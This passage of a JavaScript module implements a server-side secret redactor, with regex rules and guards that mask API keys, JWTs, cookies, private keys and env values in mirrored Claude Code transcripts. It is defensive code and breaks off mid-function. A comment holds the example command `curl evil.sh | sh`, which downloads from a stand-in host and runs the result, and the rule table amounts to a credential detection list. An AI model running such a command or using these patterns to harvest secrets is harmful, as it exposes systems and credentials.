// lib/core/redact.js — the one text redactor: what a secret looks like, in one
// place.
//
// The chat mirror (0.8.5) serves the most sensitive content web-chat has ever
// carried: Claude Code's conversation and every tool's input and output. V16
// (design/chat-mirror-validation.md) found real JWTs, an API key, cookies and
// password assignments in this machine's transcripts, so everything the mirror,
// the asks and the graph show passes through here first, server-side, before it
// reaches the bus, a socket, an HTTP body or a file (spec §5.5, §2.9). A second
// "looks like a token" regex anywhere else is a review-blocking defect: add a
// rule here instead.
//
// A leaf, and pure: it requires nothing at all (lib/core imports nothing from
// the rest of lib/, and this file not even a builtin), does no I/O and reads no
// process state. Strings in, masked strings out.
//
// MASKS. MASK(label) is the opening mark (U+2039, then `redacted:`), a label
// and the closing mark (U+203A). Neither markdown nor HTML gives those two
// characters any meaning, so a mask renders as itself everywhere. The label
// names the RULE that matched, never a prefix, a length or a hash of the value:
// two different secrets of one format mask to the same bytes, so a mask says
// what kind of thing was there and nothing about which one. The opening is
// spelled once, in MASK_OPEN, and the PEM marker once, in PEM_MARKER; both
// literals belong to this file alone (the conventions tripwire names it as
// their home), so build masks with MASK and PEM patterns from PEM_MARKER
// rather than spelling either again, here or anywhere.
//
// RULES. One frozen table, applied in order (most specific first, the generic
// key=value forms last), each row:
//
//   { id, tier, label, pre, re, group, guard?, tail?, key?, mask?, mode?, scope? }
//
//   id      the rule's name (onMask reports it; tests name rules by it)
//   tier    1 = observed in V16, 2 = a standard format V16 did not observe
//   label   what the mask says
//   pre     lowercase substrings, one of which the text must contain for the
//           rule to run at all (a cheap prefilter; the regex decides)
//   re      the global regex; null for the two rows the engine applies itself
//           (`known`, from the registered values; `json-key`, a structured walk)
//   group   the capture group to mask (0 = the whole match), or a list, the
//           first one that matched (a quoted and an unquoted value are
//           different groups)
//   guard   (value, info) → true to KEEP the value: the display-safe guard,
//           the identifier-like exclusion, a bare "Bearer <word>" in prose
//   tail    { re, group?, guard? }: the same format cut short at the END of a
//           text (Claude Code's previews, a summary's `…`, a cut window): a
//           shorter minimum, anchored to the end, searched only in the last
//           TAIL_SPAN characters
//   key     the group holding the key or flag name the guard reads
//   mask    (value, info) → the replacement, for a value that is a list of
//           pieces masked one by one (a Cookie header); it applies the guard
//           per piece
//   mode    a context-driven row ('env-dotenv', 'env-dump'): it runs only when
//           the redaction context selects it (see CONTEXT below)
//   scope   'key': applied by redactValue to a key's value, never to text
//
// Every regex is linear in its input: each token-shaped rule has a lookbehind
// so no match can start inside a run of its own alphabet, every variable-length
// scan before a required character is bounded, and test/redact-rules.test.js
// runs adversarial inputs that would hang a quadratic rule. Keep it that way:
// pane scripts and fetched pages write into what this module reads.
//
// THE DISPLAY-SAFE GUARD (assign, env-line, cli-flag, cookie). On an approval
// card `export API_KEY=$(curl evil.sh | sh)` must stay readable, so a value is
// kept when it holds shell structure, is a code reference, is a path for a
// pwd/passwd/password key, or is a literal like true/null. Credential alphabets
// never contain shell structure, so no real masking is lost. A quoted literal
// with no interpolation in it is a value, whitespace and all, and is masked.
//
// CONTEXT. redactText(text, { context }) takes the tool context the engine or
// the asks domain passes. The rules read only `context.mode`, which switches on
// the env-dotenv and env-dump rows; mapping a tool's { file, command } to a
// mode, and withholding a sensitive file's output whole (WITHHELD,
// WITHHOLD_CATEGORIES), is spec §5.5's context paragraph, built on top.
//
// KNOWN VALUES (the account email, the organisation id, web-chat's capture
// token) live only inside a createRedactor() closure: never exported, never
// serialised, never logged. JSON.stringify of a redactor is `{}`.

// ── marks ───────────────────────────────────────────────────────────────────

const MASK_OPEN = '‹redacted:';
const MARK_CLOSE = '›';
const WITHHELD_OPEN = '‹withheld: sensitive file (';
const PARTIAL_LINE = '‹partial line omitted›';
const LABEL_RE = /^[a-z][a-z0-9-]{0,31}$/;

// MASK(label) → the mask for one value. A label that is not a short lowercase
// word becomes 'secret': a mask must never carry text a caller passed through.
function MASK(label) {
  const l = String(label == null ? '' : label).toLowerCase();
  return `${MASK_OPEN}${LABEL_RE.test(l) ? l : 'secret'}${MARK_CLOSE}`;
}

// WITHHELD(category) → what replaces a sensitive file's content whole.
function WITHHELD(category) {
  const c = String(category == null ? '' : category).toLowerCase();
  return `${WITHHELD_OPEN}${LABEL_RE.test(c) ? c : 'other'})${MARK_CLOSE}`;
}

// A value that already is a mark is never masked again: redaction is
// idempotent, because the facade re-redacts what upsert already cleaned (§2.9).
// A mark's start is enough: an unquoted value stops at the space inside
// WITHHELD's or PARTIAL_LINE's text.
const MARK_STARTS = [MASK_OPEN, '‹withheld:', '‹partial line'];
function isMasked(v) {
  return MARK_STARTS.some((p) => v.startsWith(p));
}

// Whether position `s` of `text` lies inside a mark already there. Marks are
// short, so the look-back and look-ahead are bounded and a scan stays linear.
const MARK_MAX = 64;
function insideMark(text, s) {
  const lo = Math.max(0, s - MARK_MAX);
  let o = s;
  while (o >= lo && text[o] !== '‹') o--;
  if (o < lo) return false;
  const c = text.slice(o, o + MARK_MAX + 1).indexOf(MARK_CLOSE);
  return c >= 0 && o + c >= s && isMasked(text.slice(o, o + c + 1));
}

// ── value shapes ────────────────────────────────────────────────────────────

function charClasses(s) {
  let lower = 0;
  let upper = 0;
  let digit = 0;
  for (let i = 0; i < s.length; i++) {
    const c = s.charCodeAt(i);
    if (c >= 97 && c <= 122) lower = 1;
    else if (c >= 65 && c <= 90) upper = 1;
    else if (c >= 48 && c <= 57) digit = 1;
  }
  return lower + upper + digit;
}

// Shannon entropy in bits per character, over UTF-16 code units.
function entropy(s) {
  const counts = new Map();
  for (let i = 0; i < s.length; i++) counts.set(s[i], (counts.get(s[i]) || 0) + 1);
  let h = 0;
  for (const n of counts.values()) {
    const p = n / s.length;
    h -= p * Math.log2(p);
  }
  return h;
}

// Kebab/snake identifiers (`sk-some-long-name`, `xoxb-not-a-real-token`) and
// placeholders, rather than random key material: secret_scan.py's
// is_identifier_like (V16), adapted so a short fragment (a tail) is judged
// fairly. `body` is the token minus its vendor prefix. Words, a single character
// class, or less randomness than a random string of that length has (a margin of
// one bit below log2(n), capped at the scanner's 3.3) mean an identifier.
function identifierLike(body) {
  const segs = body.split(/[-_.]+/).filter(Boolean);
  const joined = segs.join('');
  if (!joined) return true;
  const wordy = segs.filter((s) => /^[a-z]{2,}$/.test(s)).length;
  if (segs.length >= 3 && wordy >= segs.length - 1) return true;
  if (charClasses(joined) < 2) return true;
  return entropy(joined) < Math.min(3.3, Math.log2(joined.length) - 1);
}

const tokenGuard = (prefix) => (value) => identifierLike(value.replace(prefix, ''));

// A header or bare-Bearer value that could be a word in prose rather than a
// credential: one character class and shorter than a token.
const tokenLike = (v) => charClasses(v) >= 2 || v.length >= 20;

// ── the display-safe guard ──────────────────────────────────────────────────

// A shell reference: `${…}`, `$(…)`, `$TOKEN`, `$token`, `$1`, `$@`. A name
// reads as a variable when it keeps to one letter case; `$mQ2v` inside a
// generated password does not, so the password is still masked.
const VAR_REF = /\$(?:\{|\(|[A-Z_][A-Z0-9_]*(?![A-Za-z0-9_])|[a-z_][a-z0-9_]*(?![A-Za-z0-9_])|[\d@*#?!$-])/;
// A quoted literal interpolates when it holds a backtick or a reference anywhere.
const INTERPOLATES = new RegExp(`\\x60|${VAR_REF.source}`);
// An unquoted value: shell structure anywhere, or a code reference: it IS a
// reference (`$NAME…`), reads the environment, calls (`(`) or subscripts.
const SHELL_STRUCTURE = /[\x60;|<>\s]|\$\(|\$\{|&&/;
const STARTS_WITH_REF = new RegExp(`^${VAR_REF.source}`);
const CODE_REFERENCE = /process\.env|os\.environ|getenv|\(|^[A-Za-z_$][\w$]*\[/;
const PATH_VALUE = /^(?:~?\/|\.{1,2}\/|[A-Za-z]:[\\/])/;
const PWD_KEY = /pass(?:word|wd)|pwd/i;
// Literals the spec names (and their spellings elsewhere), plus the keywords
// and type names that follow `name =` / `name:` in code (`token = await f()`,
// `password: string`): code, not values.
const CODE_WORDS = new Set([
  'true', 'false', 'null', 'none', 'undefined', 'nil',
  'await', 'new', 'typeof', 'void', 'yield', 'async', 'function', 'lambda', 'not', 'this', 'self', 'cls', 'super',
  'require', 'import',
  'string', 'number', 'boolean', 'bool', 'any', 'unknown', 'never', 'object', 'symbol', 'bigint', 'str', 'int',
  'float', 'bytes', 'dict', 'list', 'optional',
  // GitHub Actions: `secrets: inherit` passes a workflow's secrets on by name.
  'inherit',
]);

// `config.token`, `self.password`, `process.env`: segments that read as names
// (letters, then at most a version number). A random value with a dot in it
// (`SG.<random>.<random>`) has digits inside its segments and is not one.
function dottedIdentifier(v) {
  const parts = v.split('.');
  return parts.length >= 2 && parts.every((p) => p.length <= 32 && /^[A-Za-z_$][A-Za-z_$]*\d{0,3}$/.test(p));
}

// displaySafe(value, { quoted, key }) → true when the value stays readable.
function displaySafe(value, { quoted = false, key = '' } = {}) {
  if (PWD_KEY.test(key) && PATH_VALUE.test(value)) return true;
  if (quoted) return INTERPOLATES.test(value);
  return SHELL_STRUCTURE.test(value) || STARTS_WITH_REF.test(value) || CODE_REFERENCE.test(value)
    || dottedIdentifier(value) || CODE_WORDS.has(value.toLowerCase());
}

// ── key names ───────────────────────────────────────────────────────────────

// sensitiveKey(name) → whether a key or flag name holds a credential: it
// contains password/passwd/passphrase/secret, or ends with token, pwd, an
// api/access/account/private/... key or credential(s), or is an Authorization or Cookie
// header. Separators and case do not matter (`api_key`, `apiKey`, `X-API-Key`).
// `session_id`, `max_tokens` and `tokenizer` are not credentials.
const KEY_CONTAINS = /pass(?:word|wd|wort|phrase)|secret/;
const KEY_ENDS = /(?:token|pwd|apikey|accesskey|accountkey|privatekey|authkey|signingkey|encryptionkey|masterkey|credentials?)$/;
const KEY_EXACT = /^(?:(?:proxy)?authorization|(?:set)?cookies?)$/;
function sensitiveKey(name) {
  if (typeof name !== 'string' || !name) return false;
  const n = name.toLowerCase().replace(/[^a-z0-9]/g, '');
  return KEY_CONTAINS.test(n) || KEY_ENDS.test(n) || KEY_EXACT.test(n);
}

// ── shared pattern pieces ───────────────────────────────────────────────────

// The end of a text, for a tail: nothing after the fragment but whitespace,
// dots and the ellipsis a summary appends. Never used with the m flag.
const END = String.raw`(?=[\s.…]*$)`;
// What may close a key before its separator: its quote (escaped when the JSON
// sits inside a string) or the ] of `params[token]`.
const KEY_CLOSE = String.raw`(?:\\?["']|\])?`;
// = : => and a spaced := (Go). A `:` glued to - + = or ? is a shell parameter
// expansion's operator (`${DB_PASSWORD:-dev}`), not an assignment.
const SEP = String.raw`[ \t]*(?::=(?=[ \t])|=>|=|:(?![-+=?]))[ \t]*`;
// An unquoted value's characters: up to whitespace, a quote, a delimiter or a
// closing bracket, and never a backslash (in JSON text that starts an escape).
// `(` and `[` stay in, so the guard sees `getToken()` and `env["X"]` as code.
const UNQ = String.raw`[^\s"'\x60,;&|<>{})\\]`;
const UNQ_TAIL = String.raw`[^\s"'\x60,;&|<>{})\\…]`;
// A value: double-quoted (escapes allowed), single-quoted, escaped-double-quoted
// (JSON inside a JSON string) or unquoted of at least `min` characters. The
// inner text of a quoted value is what is masked; the quotes stay.
const VALUE = (min) => String.raw`(?:"((?:[^"\\\r\n]|\\.)*)"|'([^'\r\n]*)'|\\"([^"\\\r\n]*)\\"|(${UNQ}{${min},}))`;
// A value cut short at the end of the text: an opened quote, or unquoted.
const VALUE_TAIL = String.raw`(?:\\?["']([^"'\\\r\n…]+)|(${UNQ_TAIL}+))`;
// A line's start, past a Read-tool or `cat -n` line number (`     3→`).
const LINE_HEAD = String.raw`^[ \t]*(?:\d+[\t→│|][ \t]*)?`;
// Where a token may start: never inside a run of its own alphabet (so no match
// can begin at every dash of `eyJa-eyJa-…`, which keeps each rule linear), but
// right after a percent-encoded byte (`…%3Ftoken%3Dsk-…` in an encoded
// redirect URL), since `%` ends every token alphabet.
const START = (cls) => String.raw`(?:(?<=%[0-9A-Fa-f]{2})|(?<![${cls}]))`;

// The key words of an assignment: contained anywhere (password, secret) or
// ending the name (token, pwd, api_key, credentials …), as sensitiveKey reads
// them, with separators allowed inside (`api-key`, `apiKey`, `api_key`).
const KEY_WORDS = String.raw`(?:pass(?:word|wd|wort|phrase)|secret)[A-Za-z0-9_.-]{0,40}|token|pwd|(?:api|access|account|private|auth|signing|encryption|master)[_.-]?key|credentials?`;

// The one spelling of the PEM marker.
const PEM_MARKER = 'PRIVATE KEY-----';
const PEM_KIND = String.raw`(?:[A-Z0-9]+ ){0,3}(?:${PEM_MARKER}|PRIVATE KEY BLOCK-----)`;
const PEM_BEGIN = `-----BEGIN ${PEM_KIND}`;
const PEM_END = `-----END ${PEM_KIND}`;

const AUTH_SCHEMES = ['bearer', 'basic', 'token', 'digest', 'bot', 'negotiate', 'ntlm', 'dpop', 'aws4-hmac-sha256'];
const SCHEMES = AUTH_SCHEMES.join('|');

// ── guards that need a rule's own shape ─────────────────────────────────────

const SK_PREFIX = /^sk-(?:ant-(?:[a-z]+\d*-)?|or-v\d+-|proj-|svcacct-|admin-|lf-)?/i;

// Authorization: a credential after a scheme is always masked; the scheme word
// alone (its credential cut off) never is; a value with no scheme, or after a
// bare `Bearer` in prose, only when it is shaped like a token.
function bearerGuard(value, { g, m }) {
  if (AUTH_SCHEMES.includes(value.toLowerCase())) return true;
  if (g === 2 && m[1] !== undefined) return false;
  return !tokenLike(value);
}

// A flag is masked only when its name is a credential's (`--token`,
// `--client-secret`, `--password-file` with a value that is not a path).
const flagGuard = (value, info) => !sensitiveKey(info.key) || displaySafe(value, info);

// Set-Cookie attributes are not cookies.
const COOKIE_ATTRIBUTES = new Set(['path', 'domain', 'expires', 'max-age', 'samesite', 'secure', 'httponly', 'priority', 'partitioned', 'version', 'comment']);

// A Cookie or Set-Cookie header value is a list: mask each cookie's value, keep
// the names and the attributes, and apply the guard per value (a header with
// `; ` in it is not shell structure, a value of `$SESSION` is).
function cookiePairs(header, info) {
  return header.replace(/(^|;)([ \t]*)([^=;\s]+)=([^;]*)/g, (all, sep, ws, name, raw) => {
    const value = raw.trim();
    if (!value || COOKIE_ATTRIBUTES.has(name.toLowerCase()) || isMasked(value)) return all;
    const quoted = value.length > 1 && value[0] === '"' && value[value.length - 1] === '"';
    if (info.guard && info.guard(quoted ? value.slice(1, -1) : value, { quoted, key: name })) return all;
    info.note();
    return `${sep}${ws}${name}=${raw.slice(0, raw.length - raw.trimStart().length)}${MASK(info.label)}${raw.slice(raw.trimEnd().length)}`;
  });
}

// ── the rules ───────────────────────────────────────────────────────────────

const tail = (src, flags, extra = {}) => ({ re: new RegExp(`${src}${END}`, flags), ...extra });

const ROWS = [
  // ── tier 1: observed on this machine (V16) ──
  {
    // A PEM private-key block, header to footer, or to the end of the text when
    // the footer is missing (a cut preview, a window).
    id: 'pem', tier: 1, label: 'private-key', pre: ['private key'],
    re: new RegExp(String.raw`${PEM_BEGIN}[\s\S]*?(?:${PEM_END}|$)`, 'g'), group: 0,
  },
  {
    // Registered values of 8 characters or more (createRedactor().addKnown):
    // applied by the engine from the redactor's own set.
    id: 'known', tier: 1, label: 'known', pre: [], re: null, group: 0,
  },
  {
    // A Cloudflare tunnel connector token: base64 of {"a":…,"t":…,"s":…}, so
    // `=` only pads its end, and a token may start right after one
    // (`TUNNEL_TOKEN=eyJhIjoi…`). Before jwt, whose tail would claim a cut one.
    id: 'cloudflare-tunnel', tier: 2, label: 'tunnel-token', pre: ['eyjhijoi'],
    re: new RegExp(String.raw`${START('A-Za-z0-9+/_-')}eyJhIjoi[A-Za-z0-9+/_-]{40,}={0,2}`, 'g'), group: 0,
    tail: tail(String.raw`${START('A-Za-z0-9+/_-')}eyJhIjoi[A-Za-z0-9+/_-]{4,}={0,2}`, 'g'),
  },
  {
    // Two or three base64url segments, the first a JSON header (`eyJ`). START
    // (where the spec reads \b) keeps a run of `eyJa-eyJa-…` from starting a
    // scan at every dash.
    id: 'jwt', tier: 1, label: 'jwt', pre: ['eyj'],
    re: new RegExp(String.raw`${START('A-Za-z0-9_-')}eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{4,}(?:\.[A-Za-z0-9_-]*)?`, 'g'), group: 0,
    tail: tail(String.raw`${START('A-Za-z0-9_-')}eyJ[A-Za-z0-9_-]{6,}(?:\.[A-Za-z0-9_-]{0,3})?`, 'g'),
  },
  {
    // sk- keys: Anthropic (sk-ant-api03-, -oat01-, …), OpenRouter (sk-or-v1-),
    // OpenAI (sk-proj-, sk-svcacct-, legacy) and kin, minus identifiers.
    id: 'sk-key', tier: 1, label: 'api-key', pre: ['sk-'],
    re: new RegExp(String.raw`${START('A-Za-z0-9_-')}sk-[A-Za-z0-9_-]{20,}`, 'g'), group: 0, guard: tokenGuard(SK_PREFIX),
    tail: tail(String.raw`${START('A-Za-z0-9_-')}sk-[A-Za-z0-9_-]{6,}`, 'g'),
  },

  // ── tier 2: standard formats V16 did not observe ──
  {
    id: 'github', tier: 2, label: 'github-token', pre: ['ghp_', 'gho_', 'ghu_', 'ghs_', 'ghr_', 'github_pat_'],
    re: new RegExp(String.raw`${START('A-Za-z0-9_')}(?:gh[pousr]_[A-Za-z0-9]{30,}|github_pat_[A-Za-z0-9_]{40,})`, 'g'), group: 0,
    tail: tail(String.raw`${START('A-Za-z0-9_')}(?:gh[pousr]_[A-Za-z0-9]{6,}|github_pat_[A-Za-z0-9_]{6,})`, 'g',
      { guard: tokenGuard(/^(?:gh[pousr]|github_pat)_/) }),
  },
  {
    id: 'aws-key-id', tier: 2, label: 'aws-key-id', pre: ['akia', 'asia'],
    re: new RegExp(String.raw`${START('A-Za-z0-9')}(?:AKIA|ASIA)[A-Z0-9]{16}(?![A-Za-z0-9])`, 'g'), group: 0,
    tail: tail(String.raw`${START('A-Za-z0-9')}(?:AKIA|ASIA)[A-Z0-9]{4,15}`, 'g'),
  },
  {
    id: 'aws-secret', tier: 2, label: 'aws-secret', pre: ['secret'],
    re: new RegExp(String.raw`(?:aws_?)?secret_?access_?key${KEY_CLOSE}${SEP}(?:\\?["'])?([A-Za-z0-9/+=]{16,})`, 'gi'), group: 1,
    tail: tail(String.raw`(?:aws_?)?secret_?access_?key${KEY_CLOSE}${SEP}(?:\\?["'])?([A-Za-z0-9/+=]+)`, 'gi'),
  },
  {
    id: 'slack-token', tier: 2, label: 'slack-token', pre: ['xox', 'xapp-'],
    re: new RegExp(String.raw`${START('A-Za-z0-9_-')}(?:xox[abposre]|xapp)-[A-Za-z0-9-]{10,}`, 'g'), group: 0, guard: tokenGuard(/^(?:xox[a-z]|xapp)-/),
    tail: tail(String.raw`${START('A-Za-z0-9_-')}(?:xox[abposre]|xapp)-[A-Za-z0-9-]{6,}`, 'g'),
  },
  {
    id: 'slack-webhook', tier: 2, label: 'slack-webhook', pre: ['hooks.slack.com'],
    re: /hooks\.slack\.com\/(?:services|workflows|triggers)\/([A-Za-z0-9_/-]{20,})/g, group: 1,
    tail: tail(String.raw`hooks\.slack\.com/(?:services|workflows|triggers)/([A-Za-z0-9_/-]+)`, 'g'),
  },
  {
    id: 'google-api-key', tier: 2, label: 'google-api-key', pre: ['aiza'],
    re: new RegExp(String.raw`${START('A-Za-z0-9_-')}AIza[0-9A-Za-z_-]{30,}`, 'g'), group: 0,
    tail: tail(String.raw`${START('A-Za-z0-9_-')}AIza[0-9A-Za-z_-]{6,}`, 'g', { guard: tokenGuard(/^AIza/) }),
  },
  {
    id: 'google-client-secret', tier: 2, label: 'google-secret', pre: ['gocspx-'],
    re: new RegExp(String.raw`${START('A-Za-z0-9_-')}GOCSPX-[0-9A-Za-z_-]{20,}`, 'g'), group: 0,
    tail: tail(String.raw`${START('A-Za-z0-9_-')}GOCSPX-[0-9A-Za-z_-]{4,}`, 'g'),
  },
  {
    id: 'google-oauth-token', tier: 2, label: 'google-token', pre: ['ya29.'],
    re: new RegExp(String.raw`${START('A-Za-z0-9_.-')}ya29\.[0-9A-Za-z_-]{20,}`, 'g'), group: 0,
    tail: tail(String.raw`${START('A-Za-z0-9_.-')}ya29\.[0-9A-Za-z_-]{6,}`, 'g', { guard: tokenGuard(/^ya29\./) }),
  },
  {
    id: 'npm', tier: 2, label: 'npm-token', pre: ['npm_'],
    re: new RegExp(String.raw`${START('A-Za-z0-9_')}npm_[A-Za-z0-9]{36,}`, 'g'), group: 0,
    tail: tail(String.raw`${START('A-Za-z0-9_')}npm_[A-Za-z0-9]{6,}`, 'g', { guard: tokenGuard(/^npm_/) }),
  },
  {
    id: 'huggingface', tier: 2, label: 'hf-token', pre: ['hf_'],
    re: new RegExp(String.raw`${START('A-Za-z0-9_')}hf_[A-Za-z0-9]{30,}`, 'g'), group: 0,
    tail: tail(String.raw`${START('A-Za-z0-9_')}hf_[A-Za-z0-9]{6,}`, 'g', { guard: tokenGuard(/^hf_/) }),
  },
  {
    // Secret and restricted keys, live and test, and webhook signing secrets.
    id: 'stripe', tier: 2, label: 'stripe-key', pre: ['_live_', '_test_', 'whsec_'],
    re: new RegExp(String.raw`${START('A-Za-z0-9_')}(?:(?:sk|rk)_(?:live|test)_[A-Za-z0-9]{16,}|whsec_[A-Za-z0-9+/=]{24,})`, 'g'), group: 0,
    tail: tail(String.raw`${START('A-Za-z0-9_')}(?:(?:sk|rk)_(?:live|test)_[A-Za-z0-9]{6,}|whsec_[A-Za-z0-9+/=]{6,})`, 'g',
      { guard: tokenGuard(/^(?:(?:sk|rk)_(?:live|test)|whsec)_/) }),
  },
  {
    // scheme://user:PASS@host. The password may itself hold an `@` (the last
    // one before the host wins); the tail is a URL cut before its `@`, and is
    // not a port (`http://localhost:5173` at the end of a sentence).
    id: 'url-creds', tier: 2, label: 'password', pre: ['://'],
    re: /\b[A-Za-z][A-Za-z0-9+.-]{1,15}:\/\/[^\s/:@"'<>\\]{0,64}:([^\s/"'<>\\]{1,256})@(?=[A-Za-z0-9.[-])/g, group: 1,
    tail: tail(String.raw`\b[A-Za-z][A-Za-z0-9+.-]{1,15}://[^\s/:@"'<>\\]{0,64}:([^\s/"'<>\\@…]{1,256})`, 'g',
      { guard: (value) => /^\d{1,5}$/.test(value) }),
  },
  {
    // curl -u user:PASS / --user user:PASS. The scan from `curl` to the flag is
    // bounded, so a line of a thousand `curl`s stays linear.
    id: 'curl-user', tier: 2, label: 'password', pre: ['curl'],
    re: /\bcurl\b[^\r\n]{0,1024}?[ \t](?:-u(?:[ \t]+|=)?|--user(?:[ \t]+|=))(?:\\?["'])?[^\s:"'\\]{0,64}:([^\s"'\\]+)/g, group: 1,
    tail: tail(String.raw`\bcurl\b[^\r\n]{0,1024}?[ \t](?:-u(?:[ \t]+|=)?|--user(?:[ \t]+|=))(?:\\?["'])?[^\s:"'\\]{0,64}:([^\s"'\\…]+)`, 'g'),
  },
  {
    // Claude Code's own IPC token, in every Bash tool's environment: the value
    // after its name, anywhere, unguarded.
    id: 'messaging-token', tier: 1, label: 'messaging-token', pre: ['claude_code_messaging_token'],
    re: new RegExp(String.raw`CLAUDE_CODE_MESSAGING_TOKEN${KEY_CLOSE}${SEP}${VALUE(1)}`, 'g'), group: [1, 2, 3, 4],
    tail: tail(String.raw`CLAUDE_CODE_MESSAGING_TOKEN${KEY_CLOSE}${SEP}${VALUE_TAIL}`, 'g', { group: [1, 2] }),
  },
  {
    // An Authorization (or Proxy-Authorization) value after its scheme, a value
    // with no scheme when it is token-shaped, and a bare `Bearer <token>`.
    id: 'bearer', tier: 1, label: 'token', pre: ['authorization', 'bearer'],
    re: new RegExp(String.raw`\b(?:proxy-)?authorization(?:\\?["'])?[ \t]*[:=][ \t]*(?:\\?["'])?(?:(${SCHEMES})[ \t]+)?([A-Za-z0-9._~+/=:-]{6,})|(?<![A-Za-z0-9])bearer[ \t]+([A-Za-z0-9._~+/-]{8,}=*)`, 'gi'),
    group: [2, 3], guard: bearerGuard,
    tail: tail(String.raw`(?:\b(?:proxy-)?authorization(?:\\?["'])?[ \t]*[:=][ \t]*(?:\\?["'])?(?:(${SCHEMES})[ \t]+)?([A-Za-z0-9._~+/=:-]+)|(?<![A-Za-z0-9])bearer[ \t]+([A-Za-z0-9._~+/-]{4,}=*))`, 'gi'),
  },
  {
    id: 'x-api-key', tier: 2, label: 'api-key', pre: ['x-api-key'],
    re: /\bx-api-key(?:\\?["'])?[ \t]*[:=][ \t]*(?:\\?["'])?([A-Za-z0-9._~+/=-]{8,})/gi, group: 1,
    tail: tail(String.raw`\bx-api-key(?:\\?["'])?[ \t]*[:=][ \t]*(?:\\?["'])?([A-Za-z0-9._~+/=-]+)`, 'gi'),
  },
  {
    // Set-Cookie and Cookie header values, cookie by cookie (cookiePairs).
    id: 'cookie', tier: 1, label: 'cookie', pre: ['cookie'],
    re: /(?<![A-Za-z0-9_-])(?:set-)?cookie(?:\\?["'])?[ \t]*:[ \t]*(?:\\?["'])?([^\r\n"'\x60\\]+)/gi, group: 1,
    guard: displaySafe, mask: cookiePairs,
  },
  {
    // --token, --password, --api-key, --client-secret … (= or a space, then the
    // value; never a following flag).
    id: 'cli-flag', tier: 2, label: 'secret', pre: ['--'],
    re: new RegExp(String.raw`(?<![\w-])--([A-Za-z][A-Za-z0-9-]{1,48})(?:=|[ \t]+(?!-))${VALUE(4)}`, 'gi'),
    group: [2, 3, 4, 5], key: 1, guard: flagGuard,
    tail: tail(String.raw`(?<![\w-])--([A-Za-z][A-Za-z0-9-]{1,48})(?:=|[ \t]+(?!-))${VALUE_TAIL}`, 'gi', { group: [2, 3] }),
  },
  {
    // In a dotenv file's text (a command that printed one): every value,
    // whatever its name; keys and comments kept.
    id: 'env-dotenv', tier: 1, label: 'env-value', pre: ['='], mode: 'env-dotenv',
    re: new RegExp(String.raw`${LINE_HEAD}(?:export[ \t]+)?([A-Za-z_][A-Za-z0-9_.-]*)[ \t]*=[ \t]*(?:"((?:[^"\\\r\n]|\\.)*)"[ \t]*\r?$|'([^'\r\n]*)'[ \t]*\r?$|([^\r\n]*?)[ \t]*\r?$)`, 'gm'),
    group: [2, 3, 4],
  },
  {
    // In an environment dump (`env`, `printenv`, `set`, `export -p`, `declare
    // -x`): the value of every variable with a credential-family name,
    // unguarded (a dump's values are literal), except a path for a pwd name.
    id: 'env-dump', tier: 1, label: 'env-value', pre: ['='], mode: 'env-dump',
    re: new RegExp(String.raw`${LINE_HEAD}(?:(?:declare|typeset)[ \t]+-[A-Za-z]+[ \t]+|export[ \t]+)?((?=[A-Za-z_])[A-Za-z0-9_]*?(?:key|token|secret|pass|pwd|auth|cred|private|session|cookie)[A-Za-z0-9_]*)=(?:"((?:[^"\\\r\n]|\\.)*)"[ \t]*\r?$|'([^'\r\n]*)'[ \t]*\r?$|([^\r\n]*?)[ \t]*\r?$)`, 'gim'),
    group: [2, 3, 4], key: 1, guard: (value, { key }) => PWD_KEY.test(key) && PATH_VALUE.test(value),
  },
  {
    // NAME=value lines whose name holds a credential family word, anywhere in
    // any text; the value runs to the end of the line, so the guard sees shell
    // structure in it.
    id: 'env-line', tier: 1, label: 'secret', pre: ['key', 'token', 'secret', 'pass', 'pwd', 'auth', 'cred', 'private', 'session', 'cookie'],
    re: new RegExp(String.raw`${LINE_HEAD}(?:export[ \t]+|declare[ \t]+-x[ \t]+)?((?=[A-Z_])[A-Z0-9_]*?(?:KEY|TOKEN|SECRET|PASS|PWD|AUTH|CRED|PRIVATE|SESSION|COOKIE)[A-Z0-9_]*)=(?:"((?:[^"\\\r\n]|\\.)*)"|'([^'\r\n]*)'|([^\r\n]*?))[ \t]*(?:[ \t]#[^\r\n]*)?\r?$`, 'gm'),
    group: [2, 3, 4], key: 1, guard: displaySafe,
  },
  {
    // password / secret / token / api_key and kin, then = : := or =>, then a
    // value (one unquoted word, or a quoted literal), guarded.
    id: 'assign', tier: 1, label: 'secret', pre: ['pass', 'secret', 'token', 'pwd', 'key', 'credential'],
    re: new RegExp(String.raw`(${KEY_WORDS})${KEY_CLOSE}${SEP}${VALUE(4)}`, 'gi'),
    group: [2, 3, 4, 5], key: 1, guard: displaySafe,
    tail: tail(String.raw`(${KEY_WORDS})${KEY_CLOSE}${SEP}${VALUE_TAIL}`, 'gi', { group: [2, 3] }),
  },
  {
    // A structured payload's key named like a credential (sensitiveKey) masks its
    // string value whole, hex included (V16: 578 token-named 64-hex values in
    // web-chat's own get_events and set_store results). redactValue only.
    id: 'json-key', tier: 1, label: 'secret', pre: [], re: null, group: 0, scope: 'key',
  },
];

function freezeRow(r) {
  const row = { ...r, pre: Object.freeze([...r.pre]) };
  if (Array.isArray(r.group)) row.group = Object.freeze([...r.group]);
  if (r.tail) row.tail = Object.freeze({ ...r.tail, ...(Array.isArray(r.tail.group) ? { group: Object.freeze([...r.tail.group]) } : {}) });
  return Object.freeze(row);
}

const RULES = Object.freeze(ROWS.map(freezeRow));

// The engine's own copies: every regex with hasIndices (`d`), so a group's
// offsets are known, and never the exported objects, whose lastIndex a caller
// may have moved.
const withIndices = (re) => new RegExp(re.source, re.flags.includes('d') ? re.flags : `${re.flags}d`);
const ENGINE = RULES.map((row) => ({
  row,
  note: Object.freeze({ id: row.id, label: row.label, tier: row.tier }),
  full: row.re && { re: withIndices(row.re), group: row.group, guard: row.guard },
  tail: row.tail && {
    re: withIndices(row.tail.re),
    group: row.tail.group !== undefined ? row.tail.group : row.group,
    guard: 'guard' in row.tail ? row.tail.guard : row.guard,
  },
}));
const NOTE_OF = new Map(ENGINE.map((e) => [e.row.id, e.note]));
const ROW_OF = new Map(RULES.map((r) => [r.id, r]));

// ── the engine ──────────────────────────────────────────────────────────────

// Nothing shorter can hold a maskable value (the shortest is an env line, `KEY=x`).
const MIN_TEXT = 5;
// A tail is searched for only this far from the end.
const TAIL_SPAN = 4096;
// A known value shorter than this is never registered (it would mask words).
const KNOWN_MIN = 8;

function pickGroup(m, group) {
  if (typeof group === 'number') return m[group] !== undefined ? group : -1;
  for (const g of group) if (m[g] !== undefined) return g;
